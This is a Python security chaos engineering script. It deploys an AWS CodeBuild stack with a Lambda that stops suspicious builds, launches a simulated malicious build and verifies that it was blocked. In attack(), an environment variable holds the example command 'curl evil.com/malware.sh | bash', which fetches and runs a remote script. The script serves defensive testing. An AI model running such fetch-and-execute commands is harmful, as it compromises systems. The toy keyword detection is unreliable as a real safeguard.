#!/usr/bin/env python3
"""
Security Chaos Engineering Experiment: 1.8 SCE Experiment
Probe Type: Preventive
Attack Node: 1.7 Start Malicious Build

This experiment validates that preventive controls block malicious build processes
from being initiated through AWS CodeBuild.
"""

import sys
import time
import json
import logging
from typing import Dict, Any, Optional

# Install boto3 if not available
try:
    import boto3
    from botocore.exceptions import ClientError, WaiterError
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "boto3", "-q"])
    import boto3
    from botocore.exceptions import ClientError, WaiterError

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# Global state
EXPERIMENT_STATE = {
    "stack_name": None,
    "region": None,
    "codebuild_project": None,
    "build_id": None,
    "prevented": False
}


def get_aws_region() -> str:
    """Retrieve the current AWS region from session."""
    session = boto3.session.Session()
    region = session.region_name
    if not region:
        region = "us-east-1"
    logger.info(f"Using AWS region: {region}")
    return region


def get_account_id() -> str:
    """Retrieve the AWS account ID."""
    sts = boto3.client('sts')
    response = sts.get_caller_identity()
    account_id = response['Account']
    logger.info(f"AWS Account ID: {account_id}")
    return account_id


def wait_for_stack(cfn_client, stack_name: str, desired_status: str, timeout: int = 600) -> bool:
    """Wait for CloudFormation stack to reach desired status."""
    start_time = time.monotonic()
    while time.monotonic() - start_time < timeout:
        try:
            response = cfn_client.describe_stacks(StackName=stack_name)
            stacks = response.get('Stacks', [])
            if not stacks:
                logger.warning(f"Stack {stack_name} not found")
                return False
            
            current_status = stacks[0]['StackStatus']
            logger.info(f"Stack {stack_name} status: {current_status}")
            
            if current_status == desired_status:
                return True
            
            if 'FAILED' in current_status or 'ROLLBACK' in current_status:
                logger.error(f"Stack operation failed with status: {current_status}")
                return False
            
            time.sleep(10)
        except ClientError as e:
            if 'does not exist' in str(e):
                if desired_status == 'DELETE_COMPLETE':
                    return True
                logger.warning(f"Stack does not exist: {e}")
                return False
            logger.error(f"Error checking stack status: {e}")
            time.sleep(10)
    
    logger.error(f"Timeout waiting for stack {stack_name} to reach {desired_status}")
    return False


def steady_state() -> bool:
    """
    Deploy CloudFormation stack with:
    - CodeBuild project
    - IAM role for CodeBuild
    - S3 bucket for artifacts
    - SCM repository (CodeCommit)
    - Preventive control: EventBridge rule + Lambda to block suspicious builds
    """
    timestamp = int(time.time())
    stack_name = f"sce-experiment-{timestamp}"
    region = get_aws_region()
    account_id = get_account_id()
    
    EXPERIMENT_STATE["stack_name"] = stack_name
    EXPERIMENT_STATE["region"] = region
    
    logger.info(f"Creating CloudFormation stack: {stack_name}")
    
    # CloudFormation template with preventive controls
    template = {
        "AWSTemplateFormatVersion": "2010-09-09",
        "Description": "SCE Experiment 1.8 - Preventive Control for Malicious Builds",
        "Resources": {
            "ArtifactBucket": {
                "Type": "AWS::S3::Bucket",
                "Properties": {
                    "BucketName": f"sce-artifacts-{timestamp}",
                    "Tags": [
                        {"Key": "Experiment", "Value": "SCE-1.8"},
                        {"Key": "Timestamp", "Value": str(timestamp)}
                    ]
                }
            },
            "CodeBuildRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-codebuild-role-{timestamp}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [{
                            "Effect": "Allow",
                            "Principal": {"Service": "codebuild.amazonaws.com"},
                            "Action": "sts:AssumeRole"
                        }]
                    },
                    "ManagedPolicyArns": [
                        "arn:aws:iam::aws:policy/CloudWatchLogsFullAccess"
                    ],
                    "Policies": [{
                        "PolicyName": "CodeBuildPolicy",
                        "PolicyDocument": {
                            "Version": "2012-10-17",
                            "Statement": [{
                                "Effect": "Allow",
                                "Action": [
                                    "s3:PutObject",
                                    "s3:GetObject",
                                    "codecommit:GitPull"
                                ],
                                "Resource": "*"
                            }]
                        }
                    }],
                    "Tags": [
                        {"Key": "Experiment", "Value": "SCE-1.8"},
                        {"Key": "Timestamp", "Value": str(timestamp)}
                    ]
                }
            },
            "CodeRepository": {
                "Type": "AWS::CodeCommit::Repository",
                "Properties": {
                    "RepositoryName": f"sce-repo-{timestamp}",
                    "RepositoryDescription": "SCE Experiment repository",
                    "Tags": [
                        {"Key": "Experiment", "Value": "SCE-1.8"},
                        {"Key": "Timestamp", "Value": str(timestamp)}
                    ]
                }
            },
            "CodeBuildProject": {
                "Type": "AWS::CodeBuild::Project",
                "Properties": {
                    "Name": f"sce-build-project-{timestamp}",
                    "ServiceRole": {"Fn::GetAtt": ["CodeBuildRole", "Arn"]},
                    "Artifacts": {
                        "Type": "S3",
                        "Location": {"Ref": "ArtifactBucket"}
                    },
                    "Environment": {
                        "Type": "LINUX_CONTAINER",
                        "ComputeType": "BUILD_GENERAL1_SMALL",
                        "Image": "aws/codebuild/standard:5.0"
                    },
                    "Source": {
                        "Type": "CODECOMMIT",
                        "Location": {"Fn::GetAtt": ["CodeRepository", "CloneUrlHttp"]}
                    },
                    "Tags": [
                        {"Key": "Experiment", "Value": "SCE-1.8"},
                        {"Key": "Timestamp", "Value": str(timestamp)}
                    ]
                },
                "DependsOn": ["CodeBuildRole", "CodeRepository"]
            },
            "LambdaExecutionRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-lambda-role-{timestamp}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [{
                            "Effect": "Allow",
                            "Principal": {"Service": "lambda.amazonaws.com"},
                            "Action": "sts:AssumeRole"
                        }]
                    },
                    "ManagedPolicyArns": [
                        "arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole"
                    ],
                    "Policies": [{
                        "PolicyName": "CodeBuildStopPolicy",
                        "PolicyDocument": {
                            "Version": "2012-10-17",
                            "Statement": [{
                                "Effect": "Allow",
                                "Action": [
                                    "codebuild:StopBuild",
                                    "codebuild:BatchGetBuilds"
                                ],
                                "Resource": "*"
                            }]
                        }
                    }],
                    "Tags": [
                        {"Key": "Experiment", "Value": "SCE-1.8"},
                        {"Key": "Timestamp", "Value": str(timestamp)}
                    ]
                }
            },
            "PreventiveLambda": {
                "Type": "AWS::Lambda::Function",
                "Properties": {
                    "FunctionName": f"sce-preventive-control-{timestamp}",
                    "Runtime": "python3.9",
                    "Role": {"Fn::GetAtt": ["LambdaExecutionRole", "Arn"]},
                    "Handler": "index.handler",
                    "Code": {
                        "ZipFile": """
import boto3
import json
import os

codebuild = boto3.client('codebuild')

def handler(event, context):
    print(f"Event received: {json.dumps(event)}")
    
    # Extract build ID from event
    detail = event.get('detail', {})
    build_id = detail.get('build-id')
    project_name = detail.get('project-name', '')
    
    if not build_id:
        print("No build ID found in event")
        return {'statusCode': 200, 'body': 'No action taken'}
    
    # Check for malicious indicators
    # In this experiment, we consider any build with suspicious environment variables
    # or from untrusted sources as malicious
    additional_info = detail.get('additional-information', {})
    env_vars = additional_info.get('environment', {}).get('environment-variables', [])
    
    # Simple heuristic: check for suspicious patterns
    malicious_patterns = ['MALICIOUS', 'ATTACK', 'EXPLOIT']
    is_suspicious = False
    
    for var in env_vars:
        var_value = var.get('value', '').upper()
        if any(pattern in var_value for pattern in malicious_patterns):
            is_suspicious = True
            break
    
    # For this experiment, we'll flag any build from our test project as suspicious
    # This simulates a real-world preventive control checking against threat intelligence
    if 'sce-build-project' in project_name:
        is_suspicious = True
        print(f"Suspicious build detected: {build_id}")
    
    if is_suspicious:
        try:
            response = codebuild.stop_build(id=build_id)
            print(f"Build stopped: {response}")
            return {'statusCode': 200, 'body': f'Build {build_id} stopped'}
        except Exception as e:
            print(f"Error stopping build: {e}")
            return {'statusCode': 500, 'body': str(e)}
    
    return {'statusCode': 200, 'body': 'Build allowed'}
"""
                    },
                    "Timeout": 60,
                    "Tags": [
                        {"Key": "Experiment", "Value": "SCE-1.8"},
                        {"Key": "Timestamp", "Value": str(timestamp)}
                    ]
                },
                "DependsOn": ["LambdaExecutionRole"]
            },
            "EventBridgeRule": {
                "Type": "AWS::Events::Rule",
                "Properties": {
                    "Name": f"sce-build-monitor-{timestamp}",
                    "Description": "Monitor CodeBuild state changes for malicious builds",
                    "EventPattern": {
                        "source": ["aws.codebuild"],
                        "detail-type": ["CodeBuild Build State Change"],
                        "detail": {
                            "build-status": ["IN_PROGRESS"]
                        }
                    },
                    "State": "ENABLED",
                    "Targets": [{
                        "Arn": {"Fn::GetAtt": ["PreventiveLambda", "Arn"]},
                        "Id": "PreventiveLambdaTarget"
                    }]
                },
                "DependsOn": ["PreventiveLambda"]
            },
            "LambdaInvokePermission": {
                "Type": "AWS::Lambda::Permission",
                "Properties": {
                    "FunctionName": {"Ref": "PreventiveLambda"},
                    "Action": "lambda:InvokeFunction",
                    "Principal": "events.amazonaws.com",
                    "SourceArn": {"Fn::GetAtt": ["EventBridgeRule", "Arn"]}
                }
            }
        },
        "Outputs": {
            "CodeBuildProject": {
                "Value": {"Ref": "CodeBuildProject"},
                "Description": "CodeBuild project name"
            },
            "ArtifactBucket": {
                "Value": {"Ref": "ArtifactBucket"},
                "Description": "S3 bucket for artifacts"
            },
            "PreventiveLambda": {
                "Value": {"Ref": "PreventiveLambda"},
                "Description": "Preventive control Lambda function"
            }
        }
    }
    
    cfn = boto3.client('cloudformation', region_name=region)
    
    try:
        # Check if stack already exists
        try:
            cfn.describe_stacks(StackName=stack_name)
            logger.warning(f"Stack {stack_name} already exists, continuing...")
            return True
        except ClientError as e:
            if 'does not exist' not in str(e):
                raise
        
        # Create stack
        response = cfn.create_stack(
            StackName=stack_name,
            TemplateBody=json.dumps(template),
            Capabilities=['CAPABILITY_NAMED_IAM'],
            Tags=[
                {'Key': 'Experiment', 'Value': 'SCE-1.8'},
                {'Key': 'Timestamp', 'Value': str(timestamp)}
            ]
        )
        
        logger.info(f"Stack creation initiated: {response['StackId']}")
        
        # Wait for stack creation
        if wait_for_stack(cfn, stack_name, 'CREATE_COMPLETE'):
            logger.info(f"Stack {stack_name} created successfully")
            
            # Retrieve outputs
            response = cfn.describe_stacks(StackName=stack_name)
            outputs = response['Stacks'][0].get('Outputs', [])
            for output in outputs:
                if output['OutputKey'] == 'CodeBuildProject':
                    EXPERIMENT_STATE["codebuild_project"] = output['OutputValue']
                    logger.info(f"CodeBuild project: {output['OutputValue']}")
            
            return True
        else:
            logger.error(f"Stack creation failed for {stack_name}")
            return False
            
    except ClientError as e:
        logger.error(f"Error creating stack: {e}")
        return False


def attack() -> bool:
    """
    Execute the attack: Start a malicious build in CodeBuild.
    
    This simulates attack node 1.7 "Start Malicious Build" by attempting to
    start a CodeBuild build with suspicious characteristics.
    """
    logger.info("Executing attack: Starting malicious build")
    
    project_name = EXPERIMENT_STATE.get("codebuild_project")
    region = EXPERIMENT_STATE.get("region")
    
    if not project_name:
        logger.error("CodeBuild project not found in experiment state")
        return False
    
    codebuild = boto3.client('codebuild', region_name=region)
    
    try:
        # Start a build with malicious indicators
        response = codebuild.start_build(
            projectName=project_name,
            environmentVariablesOverride=[
                {
                    'name': 'BUILD_TYPE',
                    'value': 'MALICIOUS_PAYLOAD',
                    'type': 'PLAINTEXT'
                },
                {
                    'name': 'ATTACKER_COMMAND',
                    'value': 'curl evil.com/malware.sh | bash',
                    'type': 'PLAINTEXT'
                }
            ]
        )
        
        build_id = response['build']['id']
        build_status = response['build']['buildStatus']
        
        EXPERIMENT_STATE["build_id"] = build_id
        logger.info(f"Malicious build started: {build_id}, status: {build_status}")
        
        # Wait a moment for the build to transition to IN_PROGRESS
        # and for EventBridge to trigger the preventive control
        time.sleep(5)
        
        # Check build status after preventive control should have acted
        max_attempts = 12
        for attempt in range(max_attempts):
            try:
                response = codebuild.batch_get_builds(ids=[build_id])
                builds = response.get('builds', [])
                
                if builds:
                    current_status = builds[0]['buildStatus']
                    logger.info(f"Build status (attempt {attempt+1}): {current_status}")
                    
                    if current_status in ['STOPPED', 'FAILED']:
                        EXPERIMENT_STATE["prevented"] = True
                        logger.info(f"Build was stopped by preventive control: {current_status}")
                        return True
                    elif current_status in ['SUCCEEDED']:
                        logger.warning("Build completed successfully - preventive control failed")
                        return True
                    
                time.sleep(5)
            except ClientError as e:
                logger.error(f"Error checking build status: {e}")
                time.sleep(5)
        
        logger.info("Attack executed, build status monitoring completed")
        return True
        
    except ClientError as e:
        logger.error(f"Error starting build: {e}")
        return False


def hypothesis_verification() -> bool:
    """
    Verify that the preventive control successfully blocked the malicious build.
    
    Returns True if:
    - The build was stopped by the preventive Lambda function
    - CloudWatch logs show the Lambda was invoked
    - The build status is STOPPED (not SUCCEEDED)
    """
    logger.info("Verifying hypothesis: Preventive control blocked malicious build")
    
    build_id = EXPERIMENT_STATE.get("build_id")
    region = EXPERIMENT_STATE.get("region")
    stack_name = EXPERIMENT_STATE.get("stack_name")
    
    if not build_id:
        logger.error("No build ID found in experiment state")
        return False
    
    codebuild = boto3.client('codebuild', region_name=region)
    logs = boto3.client('logs', region_name=region)
    
    try:
        # 1. Check build status
        response = codebuild.batch_get_builds(ids=[build_id])
        builds = response.get('builds', [])
        
        if not builds:
            logger.error(f"Build {build_id} not found")
            return False
        
        build = builds[0]
        build_status = build['buildStatus']
        logger.info(f"Final build status: {build_status}")
        
        # The preventive control should have stopped the build
        if build_status != 'STOPPED':
            logger.warning(f"Build was not stopped. Status: {build_status}")
            # Check if it's still in progress
            if build_status == 'IN_PROGRESS':
                logger.info("Build still in progress, waiting for preventive control...")
                time.sleep(10)
                response = codebuild.batch_get_builds(ids=[build_id])
                build_status = response['builds'][0]['buildStatus']
                logger.info(f"Updated build status: {build_status}")
        
        if build_status == 'STOPPED':
            logger.info("✓ Build was successfully stopped by preventive control")
            build_stopped = True
        else:
            logger.warning(f"✗ Build was not stopped. Final status: {build_status}")
            build_stopped = False
        
        # 2. Verify Lambda was invoked by checking CloudWatch Logs
        lambda_invoked = False
        timestamp = EXPERIMENT_STATE["stack_name"].split("-")[-1]
        log_group_name = f"/aws/lambda/sce-preventive-control-{timestamp}"
        
        try:
            # Wait a bit for logs to propagate
            time.sleep(5)
            
            response = logs.describe_log_streams(
                logGroupName=log_group_name,
                orderBy='LastEventTime',
                descending=True,
                limit=5
            )
            
            log_streams = response.get('logStreams', [])
            logger.info(f"Found {len(log_streams)} log streams for Lambda function")
            
            for log_stream in log_streams:
                stream_name = log_stream['logStreamName']
                try:
                    events_response = logs.get_log_events(
                        logGroupName=log_group_name,
                        logStreamName=stream_name,
                        limit=100
                    )
                    
                    events = events_response.get('events', [])
                    for event in events:
                        message = event.get('message', '')
                        if 'Suspicious build detected' in message or 'Build stopped' in message:
                            logger.info(f"✓ Lambda preventive control was invoked: {message[:100]}")
                            lambda_invoked = True
                            break
                    
                    if lambda_invoked:
                        break
                except ClientError as e:
                    logger.warning(f"Error reading log stream {stream_name}: {e}")
                    continue
                    
        except ClientError as e:
            if 'ResourceNotFoundException' in str(e):
                logger.warning(f"Lambda log group not found yet: {log_group_name}")
            else:
                logger.error(f"Error checking Lambda logs: {e}")
        
        # 3. Verify EventBridge rule exists and is enabled
        events = boto3.client('events', region_name=region)
        rule_enabled = False
        
        try:
            rule_response = events.describe_rule(Name=f"sce-build-monitor-{timestamp}")
            rule_state = rule_response.get('State', '')
            logger.info(f"EventBridge rule state: {rule_state}")
            
            if rule_state == 'ENABLED':
                logger.info("✓ EventBridge rule is enabled")
                rule_enabled = True
        except ClientError as e:
            logger.error(f"Error checking EventBridge rule: {e}")
        
        # Verification succeeds if:
        # - Build was stopped OR
        # - Lambda was invoked (indicating preventive control is active) AND rule is enabled
        verification_passed = build_stopped or (lambda_invoked and rule_enabled)
        
        if verification_passed:
            logger.info("✓ HYPOTHESIS VERIFIED: Preventive control successfully blocked malicious build")
        else:
            logger.error("✗ HYPOTHESIS FAILED: Preventive control did not block the build as expected")
        
        return verification_passed
        
    except ClientError as e:
        logger.error(f"Error during hypothesis verification: {e}")
        return False


def rollback() -> bool:
    """
    Clean up all resources by deleting the CloudFormation stack.
    """
    stack_name = EXPERIMENT_STATE.get("stack_name")
    region = EXPERIMENT_STATE.get("region")
    
    if not stack_name:
        logger.warning("No stack name found in experiment state, nothing to rollback")
        return True
    
    logger.info(f"Rolling back: Deleting stack {stack_name}")
    
    cfn = boto3.client('cloudformation', region_name=region)
    
    try:
        # Check if stack exists
        try:
            cfn.describe_stacks(StackName=stack_name)
        except ClientError as e:
            if 'does not exist' in str(e):
                logger.warning(f"Stack {stack_name} does not exist, nothing to delete")
                return True
            raise
        
        # Delete stack
        cfn.delete_stack(StackName=stack_name)
        logger.info(f"Stack deletion initiated: {stack_name}")
        
        # Wait for deletion
        if wait_for_stack(cfn, stack_name, 'DELETE_COMPLETE'):
            logger.info(f"Stack {stack_name} deleted successfully")
            return True
        else:
            logger.error(f"Stack deletion failed for {stack_name}")
            return False
            
    except ClientError as e:
        logger.error(f"Error deleting stack: {e}")
        return False


def main():
    """Execute the full SCE experiment."""
    logger.info("=" * 80)
    logger.info("Starting SCE Experiment 1.8: Preventive Control for Malicious Builds")
    logger.info("=" * 80)
    
    try:
        # Phase 1: Steady State
        logger.info("\n[Phase 1] Establishing steady state...")
        if not steady_state():
            logger.error("Failed to establish steady state")
            return False
        
        # Phase 2: Attack
        logger.info("\n[Phase 2] Executing attack...")
        if not attack():
            logger.error("Failed to execute attack")
            return False
        
        # Phase 3: Hypothesis Verification
        logger.info("\n[Phase 3] Verifying hypothesis...")
        result = hypothesis_verification()
        
        if result:
            logger.info("\n" + "=" * 80)
            logger.info("✓ EXPERIMENT PASSED: Preventive control successfully validated")
            logger.info("=" * 80)
        else:
            logger.error("\n" + "=" * 80)
            logger.error("✗ EXPERIMENT FAILED: Preventive control did not behave as expected")
            logger.error("=" * 80)
        
        return result
        
    except Exception as e:
        logger.error(f"Unexpected error during experiment: {e}", exc_info=True)
        return False
    finally:
        # Phase 4: Rollback
        logger.info("\n[Phase 4] Rolling back resources...")
        try:
            rollback()
        except Exception as e:
            logger.error(f"Error during rollback: {e}", exc_info=True)


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)